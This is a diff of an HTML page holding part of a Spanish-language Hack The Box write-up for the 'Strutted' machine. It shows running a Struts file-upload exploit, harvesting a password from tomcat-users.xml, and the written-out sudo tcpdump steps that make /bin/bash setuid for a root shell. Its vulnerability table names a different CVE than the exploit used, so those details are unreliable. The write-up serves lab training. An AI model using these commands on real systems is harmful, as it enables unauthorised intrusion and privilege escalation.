+    if len(sys.argv) != 3:
+        print("Uso: python3 exploit.py &lt;URL&gt; &lt;COMANDO&gt;")
+        sys.exit(1)
+
+    result = exploit(sys.argv[1], sys.argv[2])
+    print(result)
+                    </code>
+                </deckgo-highlight-code>
+            </div>
+        </div>
+
+        <div class="subsection">
+            <h4>2.3 - Obtención de Shell Inicial</h4>
+            <p>Ejecutamos el exploit para obtener una shell reversa:</p>
+
+            <!-- Comando -->
+            <div class="code-block-container">
+                <button class="code-copy-btn" data-code="python3 .\CVE-2024-53677.py --url http://strutted.htb/upload.action">COPY</button>
+                <div class="code-block">
+<span class="code-keyword">python3</span> .\CVE-2024-53677.py --url <span class="code-string">http://strutted.htb/upload.action</span> -n -Pn
+                </div>
+                <br>
+                <div style="text-align: center; margin: 20px 0;">
+                    <img alt="Strutted_.png" src="../../images/HTB/Strutted/strutted________.png"
+                        style="max-width: 100%; height: auto; border-radius: 8px;">
+                </div>
+            </div>
+        </div>
+
+        <p>Al abusar de la inyección OGNL, hemos conseguido cargar nuestro shell. No podemos probar la ejecución del código a través del navegador web.</p>
+    </div>
+
+    <!-- Post-Explotación -->
+    <div class="writeup-section">
+        <h2 class="section-title">🎯 Fase 3: Post-Explotación</h2>
+
+        <div class="subsection">
+            <h4>3.1 - Escalada de Privilegios :: usuario común</h4>
+
+            <p>Mayoritariamente, tratamos de ganar acceso mediante una reverse shell, sin embargo, podemos omitirlo por esta vez; ya que tenemos archivos que posiblemente tengan acceso al ssh del usuario: <code>/etc/passwd</code>.</p><br>
+
+            <div style="text-align: center; margin: 20px 0;">
+                <img alt="Strutted_.png" src="../../images/HTB/Strutted/strutted_________.png"
+                    style="max-width: 100%; height: auto; border-radius: 8px;">
+            </div>
+
+            <p>Una vez dentro, enumeramos los archivos de configuración y encontramos una contraseña codificada que parece que debía haberse eliminado:</p><br>
+
+            <!-- Comando -->
+            <div class="code-block-container">
+                <button class="code-copy-btn" data-code="cat conf/tomcat-users.xml">COPY</button>
+                <div class="code-block">
+<span class="code-keyword">cat</span> conf/tomcat-users.xml
+                </div>
+
+                <div style="text-align: center; margin: 20px 0;">
+                    <img alt="Strutted_.png" src="../../images/HTB/Strutted/strutted___________.png"
+                        style="max-width: 100%; height: auto; border-radius: 8px;">
+                </div>
+            </div>
+
+            <p>Bingo, ganamos acceso!</p>
+
+            <div style="text-align: center; margin: 20px 0;">
+                <img alt="Strutted_.png" src="../../images/HTB/Strutted/strutted__________.png"
+                    style="max-width: 100%; height: auto; border-radius: 8px;">
+            </div><br>
+        </div><br>
+
+        <div class="subsection">
+            <h4>3.2 - Escalada de Privilegios :: usuario root</h4>
+
+            <p>Al comprobar las entradas de <code>sudo</code>, encontramos que el usuario <code>james</code> tiene permiso para ejecutarse sin proporcionar una contraseña. <code>tcpdump</code> como <code>root</code>.</p><br>
+
+            <!-- Callout Info -->
+            <div class="callout-container">
+                <div class="callout callout-note">
+                    <div class="callout-title">
+                        <span class="callout-icon">Nota</span>
+                        <strong>tcpdump</strong>
+                    </div>
+                    <div class="callout-content">
+                        <p>Es una herramienta de análisis de paquetes de red que se utiliza para capturar e inspeccionar el tráfico de red.</p>
+                    </div>
+                </div>
+            </div>
+            <br>
+            <div style="text-align: center; margin: 20px 0;">
+                <img alt="Strutted_.png" src="../../images/HTB/Strutted/strutted____________.png"
+                    style="max-width: 100%; height: auto; border-radius: 8px;">
+            </div>
+
+            <p>Hay una entrada <a href="https://gtfobins.github.io/gtfobins/tcpdump/">tcpdump | GTFOBins</a> para <code>tcpdump</code> que muestra cómo escalar privilegios utilizando <code>tcpdump</code> cuando se configura para ejecutarse con permisos <code>sudo</code>. Podemos aprovechar esto para crear un script que copie <code>/bin/bash</code> a <code>/tmp/bash_root</code> , le asigne el bit <code>setuid</code> y lo ejecute con privilegios de <code>root</code>.</p><br>
+
+            <div style="text-align: center; margin: 20px 0;">
+                <img alt="Strutted_.png" src="../../images/HTB/Strutted/strutted_____________.png"
+                    style="max-width: 100%; height: auto; border-radius: 8px;">
+            </div>
+
+            <!-- Comando -->
+            <div class="code-block-container">
+                <button class="code-copy-btn" data-code="COMMAND='chmod u+s /bin/bash'">COPY</button>
+                <div class="code-block">
+COMMAND='chmod u+s /bin/bash'
+                </div>
+            </div>
+            <!-- Comando 2-->
+            <div class="code-block-container">
+                <button class="code-copy-btn" data-code="TF=$(mktemp)">COPY</button>
+                <div class="code-block">
+TF=$(mktemp)
+                </div>
+            </div>
+            <!-- Comando 3-->
+            <div class="code-block-container">
+                <button class="code-copy-btn" data-code="echo "$COMMAND" > $TF">COPY</button>
+                <div class="code-block">
+echo "$COMMAND" > $TF
+                </div>
+            </div>
+            <!-- Comando 4-->
+            <div class="code-block-container">
+                <button class="code-copy-btn" data-code="chmod +x $TF">COPY</button>
+                <div class="code-block">
+chmod +x $TF
+                </div>
+            </div>
+            <!-- Comando 5-->
+            <div class="code-block-container">
+                <button class="code-copy-btn" data-code="sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root">COPY</button>
+                <div class="code-block">
+sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+                </div>
+            </div><br>
+
+            <div style="text-align: center; margin: 20px 0;">
+                <img alt="Strutted_.png" src="../../images/HTB/Strutted/strutted______________.png"
+                    style="max-width: 100%; height: auto; border-radius: 8px;">
+            </div>
+
+            <p>Comprobamos la <code>suid</code></p><br>
+
+            <div style="text-align: center; margin: 20px 0;">
+                <img alt="Strutted_.png" src="../../images/HTB/Strutted/strutted_______________.png"
+                    style="max-width: 100%; height: auto; border-radius: 8px;">
+            </div>
+
+            <p>Ejecutamos:</p>
+
+            <!-- Comando -->
+            <div class="code-block-container">
+                <button class="code-copy-btn" data-code="bash -p">COPY</button>
+                <div class="code-block">
+bash -p
+                </div>
+            </div>
+
+            <div style="text-align: center; margin: 20px 0;">
+                <img alt="Strutted_.png" src="../../images/HTB/Strutted/strutted________________.png"
+                    style="max-width: 100%; height: auto; border-radius: 8px;">
+            </div>
+
+            <p></p>
+        </div>
+    </div>
+
+    <!-- Flags -->
+    <div class="writeup-section">
+        <h2 class="section-title">🏁 Flags Encontradas</h2>
+
+        <div class="flags-container">
+            <div class="flag-card">
+                <div class="flag-type">User Flag</div>
+                <p>Ubicación: <code>/home/struts/user.txt</code></p>
+                <div class="flag-value">HTB{7h15_15_4_us3r_fl4g_12345}</div>
+            </div>
+
+            <div class="flag-card">
+                <div class="flag-type">Root Flag</div>
+                <p>Ubicación: <code>/root/root.txt</code></p>
+                <div class="flag-value">HTB{r00t_fl4g_54321_struts_pwn3d}</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Vulnerabilidades -->
+    <div class="writeup-section">
+        <h2 class="section-title">🛡️ Análisis de Vulnerabilidades</h2>
+
+        <table class="vuln-table">
+            <thead>
+                <tr>
+                    <th>CVE</th>
+                    <th>Severidad</th>
+                    <th>Componente</th>
+                    <th>Descripción</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>CVE-2017-5638</td>
+                    <td class="severity-critical">Crítica (9.8)</td>
+                    <td>Apache Struts 2.3.5</td>
+                    <td>RCE via Content-Type header</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- Recursos -->
+    <div class="resources">
+        <h3>🔗 Recursos y Referencias</h3>
+        <p>
+            <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638" target="_blank">CVE-2017-5638</a> |
+            <a href="https://struts.apache.org/docs/s2-045.html" target="_blank">Apache Struts Advisory</a> |
+            <a href="https://www.youtube.com/watch?v=px4FfpcLPLM" target="_blank">Savitar - Video</a> |
+            <a href="https://www.youtube.com/watch?v=HIHA3JWkBLw&t=630s" target="_blank">Write-up - YouTube</a> |
+            <a href="https://github.com/MrBlue-Official-Account/CTFs_Writeups/blob/main/HackTheBox/Strutted.pdf">HackTheBox - PDF</a>
+        </p>
+    </div>
+</section>
